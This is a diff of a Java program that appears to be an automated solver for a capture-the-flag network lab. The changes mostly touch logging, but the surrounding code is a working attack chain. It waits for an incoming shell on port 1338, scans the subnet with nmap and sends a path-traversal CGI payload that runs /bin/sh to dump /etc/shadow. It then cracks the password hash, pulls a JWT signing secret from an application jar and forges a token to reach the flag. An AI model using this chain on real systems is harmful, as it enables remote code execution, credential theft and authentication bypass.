@@ -26,13 +26,14 @@ public class Solver extends Thread {
 	private InputStreamReader in;
 	private Character next;
 
+	private static final boolean DEBUG = false;
 	private static final int PORT = 1338;
 
 	@Override
 	public void run() {
 		try (ServerSocket serverSocket = new ServerSocket()) {
 			serverSocket.bind(new InetSocketAddress("0.0.0.0", PORT));
-			System.err.println("!! Socket listening on " + PORT);
+			System.err.println("🔌 Socket listening on " + PORT);
 			try (Socket socket = serverSocket.accept();
 				 PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
 				 InputStreamReader in = new InputStreamReader(socket.getInputStream())
@@ -45,7 +46,7 @@ public class Solver extends Thread {
 			//noinspection CallToPrintStackTrace
 			e.printStackTrace();
 		}
-		System.err.println("\n!! Closed socket");
+		System.err.println("\n🔌 Closed socket");
 		System.exit(0);
 	}
 
@@ -86,23 +87,29 @@ public class Solver extends Thread {
 			} catch (TimeoutException e) {
 				future.cancel(true);
 				String string = sb.toString();
-				System.err.println(string);
+				if (DEBUG) {
+					System.err.println(string);
+				}
 				return string;
 			}
 		}
 	}
 
 	private void write(String cmd) {
-		System.err.println(">" + cmd);
+		if (DEBUG) {
+			System.err.println(">" + cmd);
+		}
 		out.println(cmd);
 	}
 
 	private void solve() throws Exception {
 		read();
+		System.err.println("🪪 Determining range to scan");
 		write("ifconfig | grep addr: | grep -v 127 | cut -d ':' -f2 | cut -d ' ' -f1");
 		String myIpLines = read();
 		String myIp = myIpLines.split("\n")[0];
 
+		System.err.println("🛜 Scanning the network");
 		write("nmap -sT " + myIp.replaceAll("\\.\\d+$", ".0/24"));
 		String nmapLines = read(10);
 		// in reality, this would require version detection, but we know mailus is the vulnerable one
@@ -110,11 +117,12 @@ public class Solver extends Thread {
 		matcher.find();
 		String mailusIp = matcher.group("ip");
 
+		System.err.println("🚜 Extracting /etc/shadow from mailus");
 		write("curl -Ss 'http://" + mailusIp + "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' -d 'echo; cat /etc/shadow | grep web;'");
 		String shadowLines = read();
 
 		String shadowHash = shadowLines.split("\n")[0].split(":")[1];
-		System.err.println("!! Breaking " + shadowHash);
+		System.err.println("🔧 Breaking " + shadowHash);
 		String[] shadowParts = shadowHash.split("\\$");
 		String algo = shadowParts[1];
 		String salt = shadowParts[2];
@@ -137,11 +145,11 @@ public class Solver extends Thread {
 			}
 		}
 		if (correctPass == null) {
-			System.err.println("!! No password matched");
+			System.err.println("❗️ No password matched");
 			System.exit(1);
 			return;
 		}
-		System.err.printf("!! Password is %s%n", correctPass);
+		System.err.printf("🔓 Password is %s%n", correctPass);
 
 		// TODO find this out programmatically and use an ip
 		String logusHost = "logus";
@@ -151,16 +159,16 @@ public class Solver extends Thread {
 		Matcher uidMatcher = Pattern.compile(".*jwt for (?<uid>.*)\"}").matcher(logLines);
 		uidMatcher.find();
 		String uid = uidMatcher.group("uid");
-		System.err.printf("!! user id from log is %s%n", uid);
+		System.err.printf("🪪 user id from log is %s%n", uid);
 
 		// get jwt signing secret from authus
 		write("cd /app/ && unzip -o *.jar >/dev/null && grep secret BOOT-INF/classes/application.properties");
 		String secretLines = read();
 		String secret = secretLines.split("\n")[0].split("=")[1];
-		System.err.println("!! secret is " + secret);
+		System.err.println("🔑 secret is " + secret);
 
 		String jwt = JWT.create().withSubject(uid).sign(Algorithm.HMAC256(secret));
-		System.err.println("!! created jwt " + jwt);
+		System.err.println("🎫 created jwt " + jwt);
 
 		HttpClient client = HttpClient.newHttpClient();
 		HttpRequest request = HttpRequest
@@ -169,10 +177,12 @@ public class Solver extends Thread {
 			.uri(URI.create("http://repository/dashboard"))
 			.header("cookie", "jwt=" + jwt)
 			.build();
-		System.err.println("!! GET repository/dashboard");
+		System.err.println("🛜 GET repository/dashboard");
 		HttpResponse<String> resp = client.send(request, HttpResponse.BodyHandlers.ofString());
 		String body = resp.body();
-		System.err.println(body);
+		if (DEBUG) {
+			System.err.println(body);
+		}
 		Matcher flagMatcher = Pattern.compile("flag is (?<flag>.*)</p>").matcher(body);
 		flagMatcher.find();
 		String flag = flagMatcher.group("flag");
